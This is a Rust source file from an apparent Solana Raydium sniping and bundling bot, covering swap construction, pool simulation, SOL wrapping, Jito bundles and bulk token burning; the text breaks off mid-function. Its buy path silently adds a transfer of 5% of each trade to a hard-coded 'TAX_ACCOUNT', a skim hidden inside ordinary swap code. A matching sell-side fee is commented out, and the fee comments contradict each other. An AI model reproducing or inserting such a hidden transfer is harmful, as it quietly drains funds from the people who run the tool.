use jito_protos::searcher::SubscribeBundleResultsRequest;
use jito_searcher_client::{get_searcher_client, send_bundle_with_confirmation};
use log::info;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use solana_account_decoder::parse_token::UiAccountState;
use solana_client::{
    nonblocking::rpc_client::RpcClient,
    rpc_config::{RpcSendTransactionConfig, RpcSimulateTransactionConfig},
    rpc_request::TokenAccountsFilter,
};
use solana_program::{
    instruction::{AccountMeta, Instruction},
    program_error::ProgramError,
    pubkey::Pubkey,
};
use solana_sdk::{
    address_lookup_table::AddressLookupTableAccount,
    commitment_config::{CommitmentConfig, CommitmentLevel},
    compute_budget::ComputeBudgetInstruction,
    message::{v0::Message, VersionedMessage},
    native_token::{lamports_to_sol, sol_to_lamports},
    pubkey,
    signature::Keypair,
    signer::Signer,
    system_instruction,
    transaction::{Transaction, VersionedTransaction},
};
use spl_associated_token_account::get_associated_token_address;
use spl_token::instruction::{close_account, sync_native};
use std::{convert::TryInto, sync::Arc};
use std::{mem::size_of, str::FromStr};

use crate::{
    app::config_init::get_config,
    env::{load_config, minter::load_minter_settings},
    liquidity::utils::{tip_account, tip_txn},
    raydium_amm::subscribe::PoolKeysSniper,
};

use super::{raydium_swap_in::TradeDirection, swapper::auth_keypair};

/// Instructions supported by the AmmInfo program.
#[repr(C)]
#[derive(Clone, Debug, PartialEq)]
pub enum AmmInstruction {
    ///   0. `[]` Spl Token program id
    ///   1. `[writable]` AMM Account
    ///   2. `[]` $authority derived from `create_program_address(&[AUTHORITY_AMM, &[nonce]])`.
    ///   3. `[writable]` AMM open orders Account
    ///   4. `[writable]` (optional)AMM target orders Account, no longer used in the contract, recommended no need to add this Account.
    ///   5. `[writable]` AMM coin vault Account to swap FROM or To.
    ///   6. `[writable]` AMM pc vault Account to swap FROM or To.
    ///   7. `[]` Market program id
    ///   8. `[writable]` Market Account. Market program is the owner.
    ///   9. `[writable]` Market bids Account
    ///   10. `[writable]` Market asks Account
    ///   11. `[writable]` Market event queue Account
    ///   12. `[writable]` Market coin vault Account
    ///   13. `[writable]` Market pc vault Account
    ///   14. '[]` Market vault signer Account
    ///   15. `[writable]` User source token Account.
    ///   16. `[writable]` User destination token Account.
    ///   17. `[singer]` User wallet Account
    SwapBaseIn(SwapInstructionBaseIn),
}

impl AmmInstruction {
    fn unpack_u64(input: &[u8]) -> Result<(u64, &[u8]), ProgramError> {
        if input.len() >= 8 {
            let (amount, rest) = input.split_at(8);
            let amount = amount
                .get(..8)
                .and_then(|slice| slice.try_into().ok())
                .map(u64::from_le_bytes)
                .ok_or(ProgramError::InvalidInstructionData)?;
            Ok((amount, rest))
        } else {
            Err(ProgramError::InvalidInstructionData.into())
        }
    }
    pub fn unpack(input: &[u8]) -> Result<Self, ProgramError> {
        let (&tag, rest) = input
            .split_first()
            .ok_or(ProgramError::InvalidInstructionData)?;
        Ok(match tag {
            9 => {
                let (amount_in, rest) = Self::unpack_u64(rest)?;
                let (minimum_amount_out, _rest) = Self::unpack_u64(rest)?;
                Self::SwapBaseIn(SwapInstructionBaseIn {
                    amount_in,
                    minimum_amount_out,
                })
            }

            _ => return Err(ProgramError::InvalidInstructionData.into()),
        })
    }
    /// Packs a [AmmInstruction](enum.AmmInstruction.html) into a byte buffer.
    pub fn pack(&self) -> Result<Vec<u8>, ProgramError> {
        let mut buf = Vec::with_capacity(size_of::<Self>());
        match &*self {
            Self::SwapBaseIn(SwapInstructionBaseIn {
                amount_in,
                minimum_amount_out,
            }) => {
                buf.push(9);
                buf.extend_from_slice(&amount_in.to_le_bytes());
                buf.extend_from_slice(&minimum_amount_out.to_le_bytes());
            }
        }
        Ok(buf)
    }
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub struct SwapInstructionBaseIn {
    // SOURCE amount to transfer, output to DESTINATION is based on the exchange rate
    pub amount_in: u64,
    /// Minimum amount of DESTINATION token to output, prevents excessive slippage
    pub minimum_amount_out: u64,
}

pub const SOLC_MINT: Pubkey = pubkey!("So11111111111111111111111111111111111111112");
pub const USDC_MINT: Pubkey = pubkey!("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
pub const TAX_ACCOUNT: Pubkey = pubkey!("GeQVgDTixeGXCX3WgL2CyEofsZQUBXTzDD5Ab8Y3DjQ8");
/// Creates a 'swap base in' instruction.
pub async fn swap_base_in(
    amm_program: &Pubkey,
    amm_pool: &Pubkey,
    amm_authority: &Pubkey,
    amm_open_orders: &Pubkey,
    amm_target_orders: &Pubkey,
    amm_coin_vault: &Pubkey,
    amm_pc_vault: &Pubkey,
    market_program: &Pubkey,
    market: &Pubkey,
    market_bids: &Pubkey,
    market_asks: &Pubkey,
    market_event_queue: &Pubkey,
    market_coin_vault: &Pubkey,
    market_pc_vault: &Pubkey,
    market_vault_signer: &Pubkey,
    user_source_owner: &Pubkey,
    wallet_address: &Pubkey,
    base_mint: &Pubkey,
    amount_in: u64,
    minimum_amount_out: u64,
    direction: TradeDirection,
) -> Result<Vec<Instruction>, ProgramError> {
    let config = get_config().await.unwrap();

    let data = AmmInstruction::SwapBaseIn(SwapInstructionBaseIn {
        amount_in,
        minimum_amount_out,
    })
    .pack()?;

    let source_token_account = if direction == TradeDirection::Buy {
        get_associated_token_address(wallet_address, &SOLC_MINT)
    } else {
        get_associated_token_address(wallet_address, base_mint)
    };

    let destination_token_account = if direction == TradeDirection::Buy {
        get_associated_token_address(wallet_address, base_mint)
    } else {
        get_associated_token_address(wallet_address, &SOLC_MINT)
    };

    let mut instructions = Vec::new();

    if direction == TradeDirection::Buy {
        if config.trading.spam {
            instructions.push(
                spl_associated_token_account::instruction::create_associated_token_account(
                    &wallet_address,
                    &wallet_address,
                    base_mint,
                    &spl_token::id(),
                ),
            );
        } else {
            instructions.push(
            spl_associated_token_account::instruction::create_associated_token_account_idempotent(
                &wallet_address,
                &wallet_address,
                base_mint,
                &spl_token::id(),
            ),
        );
        }
    }

    let accounts = vec![
        // spl token
        AccountMeta::new_readonly(spl_token::id(), false),
        // amm
        AccountMeta::new(*amm_pool, false),
        AccountMeta::new_readonly(*amm_authority, false),
        AccountMeta::new(*amm_open_orders, false),
        AccountMeta::new(*amm_target_orders, false),
        AccountMeta::new(*amm_coin_vault, false),
        AccountMeta::new(*amm_pc_vault, false),
        // market
        AccountMeta::new_readonly(*market_program, false),
        AccountMeta::new(*market, false),
        AccountMeta::new(*market_bids, false),
        AccountMeta::new(*market_asks, false),
        AccountMeta::new(*market_event_queue, false),
        AccountMeta::new(*market_coin_vault, false),
        AccountMeta::new(*market_pc_vault, false),
        AccountMeta::new_readonly(*market_vault_signer, false),
        // user
        AccountMeta::new(source_token_account, false),
        AccountMeta::new(destination_token_account, false),
        AccountMeta::new_readonly(*user_source_owner, true),
    ];

    let account_swap_instructions = Instruction {
        program_id: *amm_program,
        data,
        accounts,
    };

    let sol_amount = lamports_to_sol(amount_in);
    // 5% tax on the amount_in
    let tax_amount = sol_to_lamports(sol_amount * (0.05));

    let tax_instructions =
        system_instruction::transfer(&user_source_owner, &TAX_ACCOUNT, tax_amount);

    instructions.push(account_swap_instructions);
    if direction == TradeDirection::Buy {
        instructions.push(tax_instructions);
    }

    Ok(instructions)
}

pub async fn swap_base_out(
    amm_program: &Pubkey,
    amm_pool: &Pubkey,
    amm_authority: &Pubkey,
    amm_open_orders: &Pubkey,
    amm_target_orders: &Pubkey,
    amm_coin_vault: &Pubkey,
    amm_pc_vault: &Pubkey,
    market_program: &Pubkey,
    market: &Pubkey,
    market_bids: &Pubkey,
    market_asks: &Pubkey,
    market_event_queue: &Pubkey,
    market_coin_vault: &Pubkey,
    market_pc_vault: &Pubkey,
    market_vault_signer: &Pubkey,
    user_source_owner: &Pubkey,
    wallet_address: &Pubkey,
    base_mint: &Pubkey,
    amount_in: u64,
    minimum_amount_out: u64,
    priority_fee: u64,
) -> Result<Vec<Instruction>, ProgramError> {
    let data = AmmInstruction::SwapBaseIn(SwapInstructionBaseIn {
        amount_in,
        minimum_amount_out,
    })
    .pack()?;

    let unit_limit = ComputeBudgetInstruction::set_compute_unit_limit(80000);
    let compute_price = ComputeBudgetInstruction::set_compute_unit_price(priority_fee);

    let source_token_account = get_associated_token_address(wallet_address, &SOLC_MINT);
    let destination_token_account = get_associated_token_address(wallet_address, base_mint);

    let mut instructions = Vec::new();

    instructions.push(compute_price);
    instructions.push(unit_limit);

    let accounts = vec![
        // spl token
        AccountMeta::new_readonly(spl_token::id(), false),
        // amm
        AccountMeta::new(*amm_pool, false),
        AccountMeta::new_readonly(*amm_authority, false),
        AccountMeta::new(*amm_open_orders, false),
        AccountMeta::new(*amm_target_orders, false),
        AccountMeta::new(*amm_coin_vault, false),
        AccountMeta::new(*amm_pc_vault, false),
        // market
        AccountMeta::new_readonly(*market_program, false),
        AccountMeta::new(*market, false),
        AccountMeta::new(*market_bids, false),
        AccountMeta::new(*market_asks, false),
        AccountMeta::new(*market_event_queue, false),
        AccountMeta::new(*market_coin_vault, false),
        AccountMeta::new(*market_pc_vault, false),
        AccountMeta::new_readonly(*market_vault_signer, false),
        // user
        AccountMeta::new(destination_token_account, false),
        AccountMeta::new(source_token_account, false),
        AccountMeta::new_readonly(*user_source_owner, true),
    ];

    let account_swap_instructions = Instruction {
        program_id: *amm_program,
        data,
        accounts,
    };

    // 2% tax on the amount_in
    let sol_amount = lamports_to_sol(amount_in);
    // 5% tax on the amount_in
    let tax_amount = sol_to_lamports(sol_amount * (0.01));

    let tax_instructions =
        system_instruction::transfer(&user_source_owner, &TAX_ACCOUNT, tax_amount);

    instructions.push(account_swap_instructions);
    // instructions.push(tax_instructions);

    Ok(instructions)
}

#[derive(Debug, Serialize, Deserialize)]
pub struct PoolInfo {
    status: u64,
    coin_decimals: u32,
    pc_decimals: u32,
    lp_decimals: u32,
    pool_pc_amount: u64,
    pool_coin_amount: u64,
    pnl_pc_amount: u64,
    pnl_coin_amount: u64,
    pool_lp_supply: u64,
    pool_open_time: u64,
    amm_id: String,
}

pub async fn fetch_muliple_info(
    rpc_client: Arc<RpcClient>,
    pool_keys: PoolKeysSniper,
    wallet: Arc<Keypair>,
) -> eyre::Result<PoolInfo> {
    let instructions = vec![make_simulate_pool_info_instruction(pool_keys.clone()).await?];

    let log =
        simulate_multiple_instruction(&rpc_client, instructions, pool_keys.clone(), wallet.clone())
            .await
            .ok_or(eyre::eyre!("Error: Failed to fetch pool info"))?;

    let pool_info: PoolInfo = serde_json::from_str(&log.to_string())?;

    Ok(pool_info)
}

pub async fn make_simulate_pool_info_instruction(
    pool_keys: PoolKeysSniper,
) -> Result<Instruction, ProgramError> {
    let instruction_data: [u8; 2] = [12, 0]; // 12 for instruction, 0 for simulateType

    let keys = vec![
        AccountMeta::new_readonly(pool_keys.id, false),
        AccountMeta::new_readonly(pool_keys.authority, false),
        AccountMeta::new_readonly(pool_keys.open_orders, false),
        AccountMeta::new_readonly(pool_keys.base_vault, false),
        AccountMeta::new_readonly(pool_keys.quote_vault, false),
        AccountMeta::new_readonly(pool_keys.lp_mint, false),
        AccountMeta::new_readonly(pool_keys.market_id, false),
        AccountMeta::new_readonly(pool_keys.market_event_queue, false),
    ];
    let instruction = Instruction {
        program_id: pool_keys.program_id,
        accounts: keys,
        data: instruction_data.to_vec(),
    };

    Ok(instruction)
}
pub async fn simulate_multiple_instruction(
    rpc_client: &RpcClient,
    instructions: Vec<Instruction>,
    pool_keys: PoolKeysSniper,
    wallet: Arc<Keypair>,
) -> Option<Value> {
    let lookup = address_deserailizer([pool_keys.lookup_table_account].to_vec());
    let message = match Message::try_compile(
        &wallet.pubkey(),
        &instructions,
        &[lookup],
        rpc_client.get_latest_blockhash().await.ok()?,
    ) {
        Ok(message) => message,
        Err(e) => {
            println!("Error: {:?}", e);
            return None;
        }
    };
    let transaction = match VersionedTransaction::try_new(
        solana_program::message::VersionedMessage::V0(message),
        &[&wallet],
    ) {
        Ok(transaction) => transaction,
        Err(e) => {
            println!("Error: {:?}", e);
            return None;
        }
    };

    let mut retry_count = 0;
    loop {
        let result = match rpc_client
            .simulate_transaction_with_config(
                &transaction,
                RpcSimulateTransactionConfig {
                    commitment: Some(CommitmentConfig::confirmed()),
                    ..RpcSimulateTransactionConfig::default()
                },
            )
            .await
        {
            Ok(result) => result,
            Err(_) => {
                retry_count += 1;
                if retry_count >= 2 {
                    break;
                }
                continue;
            }
        };
        if let Some(logs) = result.value.logs {
            for log in logs {
                if log.starts_with("Program log: GetPoolData:") {
                    let json_part = &log["Program log: GetPoolData:".len()..];
                    return serde_json::from_str(json_part).ok();
                }
            }
        }
    }

    None
}

pub fn address_deserailizer(address_lookup: Vec<Pubkey>) -> AddressLookupTableAccount {
    let mut addresses = Vec::new();

    for address in address_lookup {
        addresses.push(address);
    }
    let address_lookup_table_account = AddressLookupTableAccount {
        key: Pubkey::new_from_array([0; 32]),
        addresses,
    };
    address_lookup_table_account
}

#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[repr(u64)]
pub enum SwapDirection {
    /// Input token pc, output token coin
    PC2Coin = 1u64,
    /// Input token coin, output token pc
    Coin2PC = 2u64,
}
pub fn swap_token_amount_base_in(
    amount_in: u128,
    total_pc_without_take_pnl: u128,
    total_coin_without_take_pnl: u128,
    swap_direction: SwapDirection,
) -> u128 {
    let amount_out;
    match swap_direction {
        SwapDirection::Coin2PC => {
            // (x + delta_x) * (y + delta_y) = x * y
            // (coin + amount_in) * (pc - amount_out) = coin * pc
            // => amount_out = pc - coin * pc / (coin + amount_in)
            // => amount_out = ((pc * coin + pc * amount_in) - coin * pc) / (coin + amount_in)
            // => amount_out =  pc * amount_in / (coin + amount_in)
            let denominator = total_coin_without_take_pnl.checked_add(amount_in).unwrap();
            amount_out = total_pc_without_take_pnl
                .checked_mul(amount_in)
                .unwrap()
                .checked_div(denominator)
                .unwrap();
        }
        SwapDirection::PC2Coin => {
            // (x + delta_x) * (y + delta_y) = x * y
            // (pc + amount_in) * (coin - amount_out) = coin * pc
            // => amount_out = coin - coin * pc / (pc + amount_in)
            // => amount_out = (coin * pc + coin * amount_in - coin * pc) / (pc + amount_in)
            // => amount_out = coin * amount_in / (pc + amount_in)
            let denominator = total_pc_without_take_pnl.checked_add(amount_in).unwrap();
            amount_out = total_coin_without_take_pnl
                .checked_mul(amount_in)
                .unwrap()
                .checked_div(denominator)
                .unwrap();
        }
    }
    return amount_out;
}

pub async fn swap_amount_out(
    pool_info: PoolInfo,
    amount_in: u64,
    swap_direction: SwapDirection,
) -> u128 {
    let swap_fee_numerator = 25 as u128;
    let swap_fee_denominator = 10000 as u128;
    let swap_fee = u128::from(amount_in)
        .checked_mul(swap_fee_numerator)
        .unwrap()
        .checked_div(swap_fee_denominator)
        .unwrap();

    let swap_in_after_deduct_fee = u128::from(amount_in).checked_sub(swap_fee).unwrap();
    let swap_amount_out = swap_token_amount_base_in(
        swap_in_after_deduct_fee,
        pool_info.pool_coin_amount.into(),
        pool_info.pool_pc_amount.into(),
        swap_direction,
    );
    return swap_amount_out;
}

pub async fn token_price_data(
    rpc_client: Arc<RpcClient>,
    pool_keys: PoolKeysSniper,
    wallet: Arc<Keypair>,
    amount_in: u64,
    swap_direction: SwapDirection,
) -> eyre::Result<u128> {
    let mut pool_ids = pool_keys.clone();
    if pool_keys.base_mint == SOLC_MINT {
        pool_ids.base_mint = pool_keys.quote_mint.clone();
        pool_ids.quote_mint = pool_keys.base_mint.clone();
    }
    let pool_info = fetch_muliple_info(rpc_client, pool_ids.clone(), wallet).await?;
    // info!("Pool Info: {}", serde_json::to_string_pretty(&pool_info)?);
    let swap_amount_out = swap_amount_out(pool_info, amount_in, swap_direction).await;

    Ok(swap_amount_out)
}

/* ---------------------------------------------------------------- */

pub async fn wrap_sol(
    rpc_client: Arc<RpcClient>,
    wallet: &Keypair,
    amount_in: u64,
) -> Result<(), Box<dyn std::error::Error>> {
    let unit_limit = ComputeBudgetInstruction::set_compute_unit_limit(80000);
    let compute_price = ComputeBudgetInstruction::set_compute_unit_price(sol_to_lamports(0.0001));

    let user_token_destination = get_associated_token_address(&wallet.pubkey(), &SOLC_MINT);

    info!("Wrapping Sol...");
    let mut instructions = Vec::new();

    instructions.push(unit_limit);
    instructions.push(compute_price);

    // Check if the account already exists and is owned by the SPL Token program
    if let Ok(account) = rpc_client.get_account(&user_token_destination).await {
        if account.owner != spl_token::id() {
            return Err(
                eyre::eyre!("Error: Account already exists: {}", user_token_destination).into(),
            );
        }
    } else {
        // If the account does not exist or is not owned by the SPL Token program,
        // create the account.
        instructions.push(
            spl_associated_token_account::instruction::create_associated_token_account(
                &wallet.pubkey(),
                &wallet.pubkey(),
                &SOLC_MINT,
                &spl_token::id(),
            ),
        );
    }

    instructions.push(system_instruction::transfer(
        &wallet.pubkey(),
        &user_token_destination,
        amount_in,
    ));

    let sync_native = sync_native(&spl_token::id(), &user_token_destination)?;
    instructions.push(sync_native);

    let transaction = Transaction::new_signed_with_payer(
        &instructions,
        Some(&wallet.pubkey()),
        &[wallet],
        rpc_client.get_latest_blockhash().await?,
    );

    info!("Transaction Sent: {:?}", transaction.signatures[0]);

    rpc_client
        .send_and_confirm_transaction_with_spinner(&transaction)
        .await
        .unwrap();

    Ok(())
}

/*------------------------------------------------ */

pub async fn unwrap_sol(deployer: bool) -> Result<(), Box<dyn std::error::Error>> {
    let engine = load_config().await?;
    let rpc_client = RpcClient::new(engine.network.rpc_url);

    let mut keypairs: Vec<Keypair> = Vec::new();

    if deployer {
        let bundler_settings = load_minter_settings().await?;
        let buyer_wallet = Keypair::from_base58_string(&bundler_settings.buyer_key);
        let deployer_wallet = Keypair::from_base58_string(&bundler_settings.deployer_key);
        keypairs.push(buyer_wallet);
        keypairs.push(deployer_wallet);
    } else {
        let buyer_key = Keypair::from_base58_string(&engine.engine.payer_keypair);
        keypairs.push(buyer_key);
    }

    let mut instructions = Vec::new();
    for wallet in &keypairs {
        let token_accounts = rpc_client
            .get_token_accounts_by_owner(&wallet.pubkey(), TokenAccountsFilter::Mint(SOLC_MINT))
            .await?;

        let mut balances = Vec::new();
        for token_account in token_accounts {
            let account = &Pubkey::from_str(&token_account.pubkey).unwrap();
            let balance = rpc_client.get_token_account_balance(account).await?;

            let close_acc = close_account(
                &spl_token::id(),
                &account,
                &wallet.pubkey(),
                &wallet.pubkey(),
                &[&wallet.pubkey()],
            )
            .unwrap();

            balances.push(balance.amount.parse::<u64>().unwrap());
            instructions.push(close_acc);
        }
    }

    let tip_txn = tip_txn(keypairs[0].pubkey(), tip_account(), sol_to_lamports(0.0001));
    instructions.push(tip_txn);

    let recent_blockhash = rpc_client.get_latest_blockhash().await?;

    let v0_msg = VersionedMessage::V0(Message::try_compile(
        &keypairs[0].pubkey(),
        &instructions,
        &[],
        recent_blockhash,
    )?);

    let transaction =
        VersionedTransaction::try_new(v0_msg, &keypairs.iter().collect::<Vec<&Keypair>>())?;

    let mut client = match get_searcher_client(
        &engine.network.block_engine_url,
        &Arc::new(auth_keypair()),
    )
    .await
    {
        Ok(client) => client,
        Err(e) => {
            eprintln!("Error: {}", e);
            panic!("Error: {}", e);
        }
    };

    let mut bundle_results_subscription = client
        .subscribe_bundle_results(SubscribeBundleResultsRequest {})
        .await
        .expect("subscribe to bundle results")
        .into_inner();

    let bundle = match send_bundle_with_confirmation(
        &[transaction],
        &Arc::new(rpc_client),
        &mut client,
        &mut bundle_results_subscription,
    )
    .await
    {
        Ok(_) => {}
        Err(e) => {
            return Ok(());
        }
    };

    Ok(())
}
pub async fn burn_and_close_tokens() -> Result<(), Box<dyn std::error::Error>> {
    let engine = load_config().await?;

    let closing_account = Keypair::from_base58_string("INPUT-PRIVATE-KEY");

    // Define accounts to exclude
    let excluded_accounts = vec![
        Pubkey::from_str("E4qkx2bShCKxZesxjzHvkKz9qsZv2rH38K5RpipAFnTR")?,
        // Add more accounts to exclude if needed
    ];

    let account_private_keys = vec![closing_account];
    let rpc_client = RpcClient::new(engine.network.rpc_url);

    // Load the payer keypair which will pay transaction fees
    let payer_keypair = Keypair::from_base58_string(&engine.engine.payer_keypair);

    // Convert private keys to keypairs
    let mut account_keypairs: Vec<Keypair> = Vec::new();
    for private_key in account_private_keys {
        account_keypairs.push(private_key);
    }

    if account_keypairs.is_empty() {
        println!("No account keypairs provided to process");
        return Ok(());
    }

    println!(
        "Preparing to burn tokens and close accounts for {} wallets",
        account_keypairs.len()
    );

    let mut instructions = Vec::new();
    let mut signers = vec![&payer_keypair];

    // Add each account keypair to signers if not already the payer
    for keypair in &account_keypairs {
        if keypair.pubkey() != payer_keypair.pubkey() {
            signers.push(keypair);
        }
    }

    // Use SPL Token Program ID filter to get ALL token accounts
    for wallet in &account_keypairs {
        println!("Processing wallet: {}", wallet.pubkey());

        // Get all token accounts for the wallet using SPL Token Program ID
        let token_accounts = rpc_client
            .get_token_accounts_by_owner(
                &wallet.pubkey(),
                TokenAccountsFilter::ProgramId(spl_token::id()),
            )
            .await?;

        println!(
            "Found {} token accounts for wallet {}",
            token_accounts.len(),
            wallet.pubkey()
        );

        for token_account in token_accounts {
            let account_pubkey = Pubkey::from_str(&token_account.pubkey)?;

            // Skip excluded accounts
            if excluded_accounts.contains(&account_pubkey) {
                println!("Skipping excluded account: {}", account_pubkey);
                continue;
            }

            let account_info = rpc_client.get_token_account(&account_pubkey).await?;

            if let Some(token_account_data) = account_info {
                // Additional validation checks - use match instead of as_str()
                match token_account_data.state {
                    UiAccountState::Initialized => {
                        // Account is initialized, we can proceed
                    }
                    UiAccountState::Frozen => {
                        println!("Account {} is frozen, skipping", account_pubkey);
                        continue;
                    }
                    UiAccountState::Uninitialized => {
                        println!("Account {} is uninitialized, skipping", account_pubkey);
                        continue;
                    }
                    _ => {
                        println!("Account {} has unknown state, skipping", account_pubkey);
                        continue;
                    }
                }

                // Check if the account is delegated
                if token_account_data.delegate.is_some() {
                    println!(
                        "Account {} has delegated authority, skipping",
                        account_pubkey
                    );
                    continue;
                }

                // Get the mint address for this token account
                let mint_pubkey = Pubkey::from_str(&token_account_data.mint)?;
                let balance = token_account_data.token_amount.amount.parse::<u64>()?;

                // Only try to burn if there's a balance
                if balance > 0 {
                    // Verify token account is not a mint account
                    let mint_info = rpc_client.get_account(&mint_pubkey).await;
                    if mint_info.is_err() {
                        println!(
                            "Error fetching mint info for {}, skipping burn",
                            mint_pubkey
                        );
                        continue;
                    }

                    println!(
                        "Burning {} tokens from account {} (mint: {})",
                        balance, account_pubkey, mint_pubkey
                    );
                    let burn_instruction = spl_token::instruction::burn(
                        &spl_token::id(),
                        &account_pubkey,
                        &mint_pubkey,
                        &wallet.pubkey(),
                        &[&wallet.pubkey()],
                        balance,
                    )?;
                    instructions.push(burn_instruction);
                }

                // Then close the account
                println!("Closing token account {}", account_pubkey);
                let close_instruction = spl_token::instruction::close_account(
                    &spl_token::id(),
                    &account_pubkey,
                    &wallet.pubkey(), // Token goes back to owner
                    &wallet.pubkey(), // Authority
                    &[&wallet.pubkey()],
                )?;
                instructions.push(close_instruction);
            }
        }
    }

    // Check if we have any instructions to process
    if instructions.is_empty() {
        println!("No token accounts found to burn and close");
        return Ok(());
    }

    // If we have too many instructions, split into multiple transactions
    const MAX_INSTRUCTIONS_PER_TX: usize = 6; // Further reduced for better reliability

    // Create batches of instructions, each starting with a compute budget instruction
    let mut instruction_batches: Vec<Vec<Instruction>> = Vec::new();

    for chunk in instructions.chunks(MAX_INSTRUCTIONS_PER_TX) {
        let mut batch = Vec::new();

        // Add compute budget instruction at the beginning of each batch
        // Increase compute limit to 1,400,000 units (default is 200,000)
        let compute_budget_ix =
            solana_sdk::compute_budget::ComputeBudgetInstruction::set_compute_unit_limit(100_000);
        batch.push(compute_budget_ix);

        // Add a prioritization fee to increase chances of inclusion (5,000 micro-lamports per CU)
        let prioritization_ix =
            solana_sdk::compute_budget::ComputeBudgetInstruction::set_compute_unit_price(5_000);
        batch.push(prioritization_ix);

        // Add the actual transaction instructions
        for ix in chunk {
            batch.push(ix.clone());
        }

        instruction_batches.push(batch);
    }

    println!(
        "Split {} instructions into {} transactions (with compute budget instructions)",
        instructions.len(),
        instruction_batches.len()
    );

    let mut all_signatures = Vec::new();

    // Create and configure spinner
    let spinner_style = indicatif::ProgressStyle::default_spinner()
        .tick_chars("⠁⠂⠄⡀⢀⠠⠐⠈ ")
        .template("{spinner} {msg}")
        .unwrap();

    let spinner = indicatif::ProgressBar::new_spinner();
    spinner.set_style(spinner_style.clone());

    // Retry configuration
    const MAX_RETRIES: usize = 15;
    const INITIAL_BACKOFF_MS: u64 = 500;
    const MAX_BACKOFF_MS: u64 = 10000; // 10 seconds max backoff

    'batch_loop: for (i, batch) in instruction_batches.iter().enumerate() {
        let mut retry_count = 0;
        let mut backoff_ms = INITIAL_BACKOFF_MS;
        let mut success = false;

        spinner.set_message(format!(
            "Preparing transaction {}/{} with {} instructions (including compute budget)...",
            i + 1,
            instruction_batches.len(),
            batch.len()
        ));

        // Simulate the transaction first to catch errors
        let recent_blockhash = match rpc_client.get_latest_blockhash().await {
            Ok(hash) => hash,
            Err(err) => {
                println!("Error getting blockhash for simulation: {}", err);
                continue 'batch_loop;
            }
        };

        let sim_tx = Transaction::new_signed_with_payer(
            batch,
            Some(&payer_keypair.pubkey()),
            &signers,
            recent_blockhash,
        );

        match rpc_client.simulate_transaction(&sim_tx).await {
            Ok(sim_result) => {
                if let Some(err) = sim_result.value.err {
                    println!(
                        "❌ Transaction {}/{} simulation failed: {:?}",
                        i + 1,
                        instruction_batches.len(),
                        err
                    );
                    if let Some(logs) = sim_result.value.logs {
                        println!("Simulation logs:");
                        for log in logs {
                            println!("  {}", log);
                        }
                    }
                    println!("Skipping this batch due to simulation failure");
                    continue 'batch_loop;
                } else {
                    // Log compute units used in simulation
                    if let Some(units) = sim_result.value.units_consumed {
                        println!(
                            "Transaction {}/{} simulation used {} compute units",
                            i + 1,
                            instruction_batches.len(),
                            units
                        );
                    }
                }
            }
            Err(err) => {
                println!("❌ Failed to simulate transaction: {}", err);
                continue 'batch_loop;
            }
        }

        while retry_count < MAX_RETRIES && !success {
            if retry_count > 0 {
                // If retrying, get a fresh blockhash
                spinner.set_message(format!(
                    "Retrying transaction {}/{} (attempt {}/{})...",
                    i + 1,
                    instruction_batches.len(),
                    retry_count + 1,
                    MAX_RETRIES
                ));

                // Wait with exponential backoff
                tokio::time::sleep(tokio::time::Duration::from_millis(backoff_ms)).await;
                backoff_ms = std::cmp::min(backoff_ms * 2, MAX_BACKOFF_MS);
            }

            // Get a fresh blockhash for each attempt
            let recent_blockhash = match rpc_client.get_latest_blockhash().await {
                Ok(hash) => hash,
                Err(err) => {
                    println!("Error getting blockhash: {}", err);
                    retry_count += 1;
                    continue;
                }
            };

            let transaction = Transaction::new_signed_with_payer(
                batch,
                Some(&payer_keypair.pubkey()),
                &signers,
                recent_blockhash,
            );

            spinner.set_message(format!(
                "Sending transaction {}/{} with {} instructions (attempt {}/{})...",
                i + 1,
                instruction_batches.len(),
                batch.len(),
                retry_count + 1,
                MAX_RETRIES
            ));
            spinner.enable_steady_tick(std::time::Duration::from_millis(100));

            // Send transaction with retry logic
            match rpc_client
                .send_transaction_with_config(
                    &transaction,
                    RpcSendTransactionConfig {
                        skip_preflight: true,
                        preflight_commitment: Some(CommitmentLevel::Confirmed),
                        encoding: None,
                        max_retries: Some(3), // RPC-level retries
                        min_context_slot: None,
                    },
                )
                .await
            {
                Ok(sig) => {
                    // Wait for confirmation
                    let mut confirmation_attempts = 0;
                    const MAX_CONFIRMATION_ATTEMPTS: usize = 10;

                    while confirmation_attempts < MAX_CONFIRMATION_ATTEMPTS {
                        match rpc_client.get_signature_status(&sig).await {
                            Ok(Some(status)) => {
                                if status.is_ok() {
                                    spinner.finish_with_message(format!(
                                        "✅ Transaction {}/{} confirmed: {}",
                                        i + 1,
                                        instruction_batches.len(),
                                        sig
                                    ));
                                    all_signatures.push(sig);
                                    success = true;
                                    break;
                                } else {
                                    spinner.finish_with_message(format!(
                                        "❌ Transaction {}/{} failed with status: {:?}",
                                        i + 1,
                                        instruction_batches.len(),
                                        status
                                    ));
                                    break;
                                }
                            }
                            Ok(None) => {
                                // Transaction still processing
                                spinner.set_message(format!(
                                    "Waiting for confirmation of transaction {}...",
                                    sig
                                ));
                                confirmation_attempts += 1;
                                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
                            }
                            Err(err) => {
                                spinner.set_message(format!(
                                    "Error checking transaction status: {}. Retrying...",
                                    err
                                ));
                                confirmation_attempts += 1;
                                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                            }
                        }
                    }

                    if !success {
                        retry_count += 1;
                    }
                }
                Err(err) => {
                    let error_str = err.to_string();

                    // Check for specific error types that warrant retries
                    if error_str.contains("rate limit")
                        || error_str.contains("Blockhash not found")
                        || error_str.contains("transaction expiration")
                        || error_str.contains("timed out")
                    {
                        spinner.set_message(format!(
                            "Transaction {}/{} failed with retriable error: {}. Retrying...",
                            i + 1,
                            instruction_batches.len(),
                            err
                        ));
                        retry_count += 1;
                    } else if error_str.contains("insufficient fee-payer funds") {
                        // Non-retriable error - fee payer doesn't have enough funds
                        spinner.finish_with_message(format!(
                            "❌ Transaction {}/{} failed: insufficient funds for fees",
                            i + 1,
                            instruction_batches.len()
                        ));
                        println!("Error details: {}", err);
                        return Err("Insufficient funds for transaction fees".into());
                    } else {
                        // For other errors, retry a few times but log details
                        spinner.set_message(format!(
                            "Transaction {}/{} failed: {}. Retrying...",
                            i + 1,
                            instruction_batches.len(),
                            err
                        ));
                        retry_count += 1;
                    }
                }
            };
        }

        if !success {
            spinner.finish_with_message(format!(
                "❌ Transaction {}/{} failed after {} attempts",
                i + 1,
